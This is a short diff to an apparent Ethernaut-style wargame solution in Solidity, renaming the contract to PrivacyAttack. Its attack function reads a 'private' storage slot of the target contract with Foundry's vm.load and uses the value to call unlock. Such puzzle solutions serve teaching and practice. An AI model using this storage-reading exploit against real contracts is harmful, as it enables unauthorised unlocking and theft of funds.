@@ -5,7 +5,7 @@ pragma solidity ^0.8.19;
 import {Broadcasted} from "./Broadcasted.sol";
 import {console} from "forge-std/Script.sol";
 
-contract PrivacyAttk is Broadcasted {
+contract PrivacyAttack is Broadcasted {
     function attack(address payable privacyCtr_) public payable override {
         bytes32 key = vm.load(privacyCtr_, bytes32(uint256(5)));
         IPravacy(privacyCtr_).unlock(bytes16(key));
